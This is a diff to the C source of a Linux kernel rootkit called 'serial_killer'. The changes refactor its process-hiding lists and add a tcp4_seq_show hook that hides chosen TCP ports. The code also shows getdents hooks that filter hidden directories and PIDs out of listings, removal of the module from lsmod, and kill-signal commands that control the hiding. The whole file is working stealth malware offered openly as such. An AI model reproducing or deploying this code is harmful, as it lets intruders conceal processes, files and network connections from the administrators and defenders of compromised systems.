@@ -5,32 +5,35 @@
 #include <linux/dirent.h>
 #include <linux/module.h>
 #include <linux/string.h>
-#include "../utils/version_handler.h"
+#include <linux/tcp.h>
+#include "version_handler.h"
+#include "data_structures/linked_list.h"
+#include "input_validation.h"
 
 /* DESCRIPTION
-* Handles the presence of this rootkit - Hides from lsmod and ls
-*
-* kill -61 1 # Hide directories, processes and itself
-* kill -61 0 # Unhide directories, processes and itself
-* kill -62 <pid> # Add process to hide
-* kill -63 <pid> # Remove process to hide
-*/
+ * Handles the presence of this rootkit - Hides from lsmod and ls
+ *
+ * kill -61 1 # Hide directories, processes and itself
+ * kill -61 0 # Unhide directories, processes and itself
+ * kill -62 <pid> # Add process to hide
+ * kill -63 <pid> # Remove process to hide
+ */
 
 /* GLOBAL VARIABLES */
-#define MAX_CHAR 6 
-struct hidden_process_list_node{
-    char s_pid[MAX_CHAR];
-    struct hidden_process_list_node *next;
-};
-struct hidden_process_list_node *head, *tail;
-int hidden_process_list_len = 0;
+#define MAX_CHAR 6
+
+linked_list_node_t *head_proc;
+linked_list_node_t *head_port;
+int hidden_processes_len = 0;
+int hidden_ports_len = 0;
+int curr_port_index = 0;
 struct list_head *previous_module;
 char *hidden_directories[] = {"serial_killer"};
-
 
 /**********************************/
 
 /* FUNCTION PROTOTYPES */
+/*---HOOKS & ORIG---*/
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 static asmlinkage int hook_getdents64(const struct pt_regs *regs);
@@ -44,13 +47,20 @@ static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *di
 static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
 #endif
 
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v);
+/*--------------------*/
+
 void show_lsmod(void);
 void hide_lsmod(void);
 void add_hidden_process(pid_t pid);
 void remove_hidden_process(pid_t pid);
-int check_for_duplicate_pid(char *s_pid);
 void free_hidden_processes(void);
 void printk_hidden_processes(void);
+void add_hidden_port(pid_t pid);
+void remove_hidden_port(pid_t pid);
+void free_hidden_ports(void);
+void printk_hidden_ports(void);
 /******************************************************************************************************************/
 
 void show_lsmod(void) {
@@ -58,7 +68,8 @@ void show_lsmod(void) {
     return;
 }
 
-void hide_lsmod(void) {
+void hide_lsmod(void)
+{
     previous_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     return;
@@ -66,98 +77,98 @@ void hide_lsmod(void) {
 
 void add_hidden_process(pid_t pid) {
     char s_pid[MAX_CHAR];
-    if (pid < 0 || pid > 99999) {
-        printk(KERN_ERR "serial_killer: Invalid PID!");
+    if (!is_valid_pid(pid)) {
         return;
     }
     sprintf(s_pid, "%d", pid);
-    if (check_for_duplicate_pid(s_pid)) {
+    if (!is_unique_entry(s_pid, head_proc)) {
         return;
     }
-    //printk(KERN_DEBUG "value of original s_pid - %s", s_pid);
-    struct hidden_process_list_node *new_proc;
-    new_proc = kzalloc(sizeof(struct hidden_process_list_node), GFP_KERNEL);
-    strncpy(new_proc->s_pid, s_pid, MAX_CHAR);
-    new_proc->next = NULL;
-    if (hidden_process_list_len == 0) {
-        head = new_proc;   
-        tail = head;
-    } else {
-        tail->next = new_proc;
-        tail = new_proc;
-    }
-    hidden_process_list_len += 1;
+    head_proc = add_node(head_proc, s_pid, hidden_processes_len);
+    hidden_processes_len = get_linked_list_len(head_proc);
     return;
 }
 
 void remove_hidden_process(pid_t pid) {
     char s_pid[MAX_CHAR];
-    if (pid < 0 || pid > 99999) {
-        printk(KERN_ERR "serial_killer: Invalid PID!");
+    if (!is_valid_pid(pid)) {
         return;
     }
     sprintf(s_pid, "%d", pid);
-    struct hidden_process_list_node *curr = head;
-    struct hidden_process_list_node *prev = curr;
-    while (curr != NULL) {
-        if ((memcmp(curr->s_pid, s_pid, MAX_CHAR) == 0)){
-            if(curr == head) {
-                head = curr->next;
-            } else if (curr != head || curr != tail){
-                prev->next = curr->next;
-            } else if (curr == tail) {
-                prev->next = NULL;
-                tail = prev;
-            }
-            kfree(curr);
-            hidden_process_list_len--;
-            return;
-        }
-        prev = curr;
-        curr = curr->next;
-    }
+    head_proc = remove_node(head_proc, s_pid, hidden_processes_len);
+    hidden_processes_len = get_linked_list_len(head_proc);
     return;
 }
 
-int check_for_duplicate_pid(char *s_pid) {
-    struct hidden_process_list_node *curr = head;
-    while (curr != NULL) {
-        if (memcmp(curr->s_pid, s_pid, MAX_CHAR) == 0) {
-            printk(KERN_ERR "serial_killer: Found duplicate PID - %s\n", curr->s_pid);
-            return 1;
-        }
-        curr = curr->next;
-    }
-    return 0;
+void free_hidden_processes(void) {
+    free_nodes(head_proc);
+    hidden_processes_len = 0;
+    return;
+}
+void printk_hidden_processes(void) {
+    printk(KERN_DEBUG "serial_killer: hidden process linked list (%d) - ", hidden_processes_len);
+    printk_nodes(head_proc);
+    return;
 }
 
-void free_hidden_processes(void){
-    struct hidden_process_list_node *curr = head;
-    while (curr != NULL) {
-        // Move the head to the next node before freeing the current.
-        head = curr->next;
-        kfree(curr);
-        curr = head;
+void add_hidden_port(pid_t pid) {
+    char s_port[MAX_CHAR];
+    if (!is_valid_port(pid)) {
+        return;
     }
-    hidden_process_list_len = 0;
+    sprintf(s_port, "%d", pid);
+    if (!is_unique_entry(s_port, head_port)) {
+        return;
+    }
+    head_port = add_node(head_port, s_port, hidden_ports_len);
+    hidden_ports_len = get_linked_list_len(head_port);
     return;
 }
-void printk_hidden_processes(void){
-    struct hidden_process_list_node *curr = head;
-    printk(KERN_DEBUG "serial_killer: hidden process linked list -  ");
-    while (curr != NULL) {
-        printk(KERN_CONT "%s ", curr->s_pid);
-        curr = curr->next;
-    } 
-    printk(KERN_CONT "\n");
+void remove_hidden_port(pid_t pid) {
+    char s_port[MAX_CHAR];
+    if (!is_valid_port(pid)) {
+        return;
+    }
+    sprintf(s_port, "%d", pid);
+    head_port = remove_node(head_port, s_port, hidden_ports_len);
+    hidden_ports_len = get_linked_list_len(head_port);
     return;
+}
+void free_hidden_ports(void) {
+    free_nodes(head_port);
+    hidden_ports_len = 0;
+    return;
+}
+void printk_hidden_ports(void) {
+    printk(KERN_DEBUG "serial_killer: hidden ports linked list (%d) - ", hidden_ports_len);
+    printk_nodes(head_port);
+}
+
+static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct inet_sock *is;
+    char s_inet_sport[MAX_CHAR];
+
+    if (v != SEQ_START_TOKEN) {
+		is = (struct inet_sock *)v;
+        sprintf(s_inet_sport, "%d", ntohs(is->inet_sport));
+        //printk(KERN_DEBUG "serial_killer: conversion from %d to %s\n", is->inet_sport, s_inet_sport);
+		if (is_present_in_linked_list(s_inet_sport, head_port)) {
+            //printk(KERN_DEBUG "serial_killer: Found port %s\n", s_inet_sport);
+            return 0;
+		}
+	}
+
+	return orig_tcp4_seq_show(seq, v);
 }
 
 #ifdef PTREGS_SYSCALL_STUBS
-static asmlinkage int hook_getdents64(const struct pt_regs *regs){
+static asmlinkage int hook_getdents64(const struct pt_regs *regs)
+{
 
     int err;
     int index;
+    linked_list_node_t *curr_proc;
 
     /* Intermediate structures for looping through the directory listing*/
     struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
@@ -170,35 +181,43 @@ static asmlinkage int hook_getdents64(const struct pt_regs *regs){
     int ret = orig_getdents64(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
 
-    if (ret <= 0 || dirent_ker == NULL){
+    if (ret <= 0 || dirent_ker == NULL)
+    {
         goto done;
     }
 
     /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
     err = copy_from_user(dirent_ker, dirent, ret);
-    if (err) {
+    if (err)
+    {
         goto done;
     }
 
     /* Iterate through the array of directories to hide */
     index = 0;
-    while (index < ARRAY_SIZE(hidden_directories)) {
+    while (index < ARRAY_SIZE(hidden_directories))
+    {
         /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
-        while (offset < ret) {
+        while (offset < ret)
+        {
             /* First iteration looks at dirent_ker + 0, which is the */
             current_dir = (void *)dirent_ker + offset;
             /* Compare current_dir->d_name to our string*/
-            if (memcmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0) {
-                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
+            if (strncmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0)
+            {
+                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                 /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
-                if (current_dir == dirent_ker) {
+                if (current_dir == dirent_ker)
+                {
                     ret -= current_dir->d_reclen;
                     memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                     continue;
                 }
                 /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                 previous_dir->d_reclen += current_dir->d_reclen;
-            } else {
+            }
+            else
+            {
                 previous_dir = current_dir;
             }
             offset += current_dir->d_reclen;
@@ -207,25 +226,31 @@ static asmlinkage int hook_getdents64(const struct pt_regs *regs){
         offset = 0;
     }
 
-    struct hidden_process_list_node *curr_proc = head;
-    while (curr_proc != NULL) {
+    curr_proc = head_proc;
+    while (curr_proc != NULL)
+    {
         /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
-        while (offset < ret) {
+        while (offset < ret)
+        {   
             /* First iteration looks at dirent_ker + 0, which is the */
             current_dir = (void *)dirent_ker + offset;
             /* Compare current_dir->d_name to our string*/
-            if ((memcmp(curr_proc->s_pid, current_dir->d_name, MAX_CHAR) == 0) 
-            && (strncmp(curr_proc->s_pid, "", MAX_CHAR) != 0)) {
-                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
+            //printk(KERN_DEBUG "%s %s %d\n",curr_proc->name, current_dir->d_name, strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR));
+            if ((strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR) == 0) && (strncmp(curr_proc->name, "", MAX_CHAR) != 0))
+            {   
+                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                 /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
-                if (current_dir == dirent_ker) {
+                if (current_dir == dirent_ker)
+                {
                     ret -= current_dir->d_reclen;
                     memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                     continue;
                 }
                 /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                 previous_dir->d_reclen += current_dir->d_reclen;
-            } else {
+            }
+            else
+            {
                 previous_dir = current_dir;
             }
             offset += current_dir->d_reclen;
@@ -235,18 +260,21 @@ static asmlinkage int hook_getdents64(const struct pt_regs *regs){
     }
     /* Copy our altered dirent structure back to userspace so it can be returned.*/
     err = copy_to_user(dirent, dirent_ker, ret);
-    if (err) {
+    if (err)
+    {
         goto done;
     }
 
-done:    
+done:
     kfree(dirent_ker);
     return ret;
-} 
+}
 
-static asmlinkage int hook_getdents(const struct pt_regs *regs){
+static asmlinkage int hook_getdents(const struct pt_regs *regs)
+{
 
-    const struct linux_dirent {
+    const struct linux_dirent
+    {
         unsigned long d_ino;
         unsigned long d_off;
         unsigned short d_reclen;
@@ -255,6 +283,7 @@ static asmlinkage int hook_getdents(const struct pt_regs *regs){
 
     int err;
     int index;
+    linked_list_node_t *curr_proc;
 
     /* Intermediate structures for looping through the directory listing*/
     struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
@@ -267,35 +296,43 @@ static asmlinkage int hook_getdents(const struct pt_regs *regs){
     int ret = orig_getdents64(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
 
-    if (ret <= 0 || dirent_ker == NULL){
+    if (ret <= 0 || dirent_ker == NULL)
+    {
         goto done;
     }
 
     /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
     err = copy_from_user(dirent_ker, dirent, ret);
-    if (err) {
+    if (err)
+    {
         goto done;
     }
 
     /* Iterate through the array of directories to hide */
     index = 0;
-    while (index < ARRAY_SIZE(hidden_directories)) {
+    while (index < ARRAY_SIZE(hidden_directories))
+    {
         /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
-        while (offset < ret) {
+        while (offset < ret)
+        {
             /* First iteration looks at dirent_ker + 0, which is the */
             current_dir = (void *)dirent_ker + offset;
             /* Compare current_dir->d_name to our string*/
-            if (memcmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0) {
-                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
+            if (strncmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0)
+            {
+                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                 /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
-                if (current_dir == dirent_ker) {
+                if (current_dir == dirent_ker)
+                {
                     ret -= current_dir->d_reclen;
                     memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                     continue;
                 }
                 /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                 previous_dir->d_reclen += current_dir->d_reclen;
-            } else {
+            }
+            else
+            {
                 previous_dir = current_dir;
             }
             offset += current_dir->d_reclen;
@@ -304,25 +341,30 @@ static asmlinkage int hook_getdents(const struct pt_regs *regs){
         offset = 0;
     }
 
-    struct hidden_process_list_node *curr_proc = head;
-    while (curr_proc != NULL) {
+    curr_proc = head_proc;
+    while (curr_proc != NULL)
+    {
         /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
-        while (offset < ret) {
+        while (offset < ret)
+        {
             /* First iteration looks at dirent_ker + 0, which is the */
             current_dir = (void *)dirent_ker + offset;
             /* Compare current_dir->d_name to our string*/
-            if ((memcmp(curr_proc->s_pid, current_dir->d_name, MAX_CHAR) == 0) 
-            && (strncmp(curr_proc->s_pid, "", MAX_CHAR) != 0)) {
-                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
+            if ((strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR) == 0) && (strncmp(curr_proc->name, "", MAX_CHAR) != 0))
+            {
+                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                 /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
-                if (current_dir == dirent_ker) {
+                if (current_dir == dirent_ker)
+                {
                     ret -= current_dir->d_reclen;
                     memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                     continue;
                 }
                 /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                 previous_dir->d_reclen += current_dir->d_reclen;
-            } else {
+            }
+            else
+            {
                 previous_dir = current_dir;
             }
             offset += current_dir->d_reclen;
@@ -332,19 +374,22 @@ static asmlinkage int hook_getdents(const struct pt_regs *regs){
     }
     /* Copy our altered dirent structure back to userspace so it can be returned.*/
     err = copy_to_user(dirent, dirent_ker, ret);
-    if (err) {
+    if (err)
+    {
         goto done;
     }
 
-done:    
+done:
     kfree(dirent_ker);
     return ret;
 }
 
 #else
-static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
-    
+static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
+{
+
     int err;
+    linked_list_node_t *curr_proc;
 
     /* Intermediate structures for looping through the directory listing*/
     struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
@@ -354,35 +399,43 @@ static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *di
     int ret = orig_getdents64(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
 
-    if (ret <= 0 || dirent_ker == NULL){
+    if (ret <= 0 || dirent_ker == NULL)
+    {
         goto done;
     }
 
     /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
     err = copy_from_user(dirent_ker, dirent, ret);
-    if (err) {
+    if (err)
+    {
         goto done;
     }
 
     /* Iterate through the array of directories to hide */
     index = 0;
-    while (index < ARRAY_SIZE(hidden_directories)) {
+    while (index < ARRAY_SIZE(hidden_directories))
+    {
         /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
-        while (offset < ret) {
+        while (offset < ret)
+        {
             /* First iteration looks at dirent_ker + 0, which is the */
             current_dir = (void *)dirent_ker + offset;
             /* Compare current_dir->d_name to our string*/
-            if (memcmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0) {
-                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
+            if (strncmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0)
+            {
+                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                 /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
-                if (current_dir == dirent_ker) {
+                if (current_dir == dirent_ker)
+                {
                     ret -= current_dir->d_reclen;
                     memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                     continue;
                 }
                 /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                 previous_dir->d_reclen += current_dir->d_reclen;
-            } else {
+            }
+            else
+            {
                 previous_dir = current_dir;
             }
             offset += current_dir->d_reclen;
@@ -391,25 +444,30 @@ static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *di
         offset = 0;
     }
 
-    struct hidden_process_list_node *curr_proc = head;
-    while (curr_proc != NULL) {
+    curr_proc = head_proc;
+    while (curr_proc != NULL)
+    {
         /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
-        while (offset < ret) {
+        while (offset < ret)
+        {
             /* First iteration looks at dirent_ker + 0, which is the */
             current_dir = (void *)dirent_ker + offset;
             /* Compare current_dir->d_name to our string*/
-            if ((memcmp(curr_proc->s_pid, current_dir->d_name, MAX_CHAR) == 0) 
-            && (strncmp(curr_proc->s_pid, "", MAX_CHAR) != 0)) {
-                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
+            if ((strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR) == 0) && (strncmp(curr_proc->name, "", MAX_CHAR) != 0))
+            {
+                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                 /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
-                if (current_dir == dirent_ker) {
+                if (current_dir == dirent_ker)
+                {
                     ret -= current_dir->d_reclen;
                     memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                     continue;
                 }
                 /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                 previous_dir->d_reclen += current_dir->d_reclen;
-            } else {
+            }
+            else
+            {
                 previous_dir = current_dir;
             }
             offset += current_dir->d_reclen;
@@ -419,19 +477,21 @@ static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *di
     }
     /* Copy our altered dirent structure back to userspace so it can be returned.*/
     err = copy_to_user(dirent, dirent_ker, ret);
-    if (err) {
+    if (err)
+    {
         goto done;
     }
 
-done:    
+done:
     kfree(dirent_ker);
     return ret;
-
 }
 
-static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
-    
-    const struct linux_dirent {
+static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count)
+{
+
+    const struct linux_dirent
+    {
         unsigned long d_ino;
         unsigned long d_off;
         unsigned short d_reclen;
@@ -439,6 +499,7 @@ static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent
     };
 
     int err;
+    linked_list_node_t *curr_proc;
 
     /* Intermediate structures for looping through the directory listing*/
     struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
@@ -448,35 +509,43 @@ static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent
     int ret = orig_getdents64(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
 
-    if (ret <= 0 || dirent_ker == NULL){
+    if (ret <= 0 || dirent_ker == NULL)
+    {
         goto done;
     }
 
     /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
     err = copy_from_user(dirent_ker, dirent, ret);
-    if (err) {
+    if (err)
+    {
         goto done;
     }
 
     /* Iterate through the array of directories to hide */
     index = 0;
-    while (index < ARRAY_SIZE(hidden_directories)) {
+    while (index < ARRAY_SIZE(hidden_directories))
+    {
         /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
-        while (offset < ret) {
+        while (offset < ret)
+        {
             /* First iteration looks at dirent_ker + 0, which is the */
             current_dir = (void *)dirent_ker + offset;
             /* Compare current_dir->d_name to our string*/
-            if (memcmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0) {
-                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
+            if (strncmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0)
+            {
+                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                 /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
-                if (current_dir == dirent_ker) {
+                if (current_dir == dirent_ker)
+                {
                     ret -= current_dir->d_reclen;
                     memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                     continue;
                 }
                 /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                 previous_dir->d_reclen += current_dir->d_reclen;
-            } else {
+            }
+            else
+            {
                 previous_dir = current_dir;
             }
             offset += current_dir->d_reclen;
@@ -485,25 +554,30 @@ static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent
         offset = 0;
     }
 
-    struct hidden_process_list_node *curr_proc = head;
-    while (curr_proc != NULL) {
+    curr_proc = head_proc;
+    while (curr_proc != NULL)
+    {
         /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
-        while (offset < ret) {
+        while (offset < ret)
+        {
             /* First iteration looks at dirent_ker + 0, which is the */
             current_dir = (void *)dirent_ker + offset;
             /* Compare current_dir->d_name to our string*/
-            if ((memcmp(curr_proc->s_pid, current_dir->d_name, MAX_CHAR) == 0) 
-            && (strncmp(curr_proc->s_pid, "", MAX_CHAR) != 0)) {
-                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
+            if ((strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR) == 0) && (strncmp(curr_proc->name, "", MAX_CHAR) != 0))
+            {
+                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                 /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
-                if (current_dir == dirent_ker) {
+                if (current_dir == dirent_ker)
+                {
                     ret -= current_dir->d_reclen;
                     memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                     continue;
                 }
                 /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                 previous_dir->d_reclen += current_dir->d_reclen;
-            } else {
+            }
+            else
+            {
                 previous_dir = current_dir;
             }
             offset += current_dir->d_reclen;
@@ -513,15 +587,14 @@ static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent
     }
     /* Copy our altered dirent structure back to userspace so it can be returned.*/
     err = copy_to_user(dirent, dirent_ker, ret);
-    if (err) {
+    if (err)
+    {
         goto done;
     }
 
-done:    
+done:
     kfree(dirent_ker);
     return ret;
 }
 
 #endif
-
-
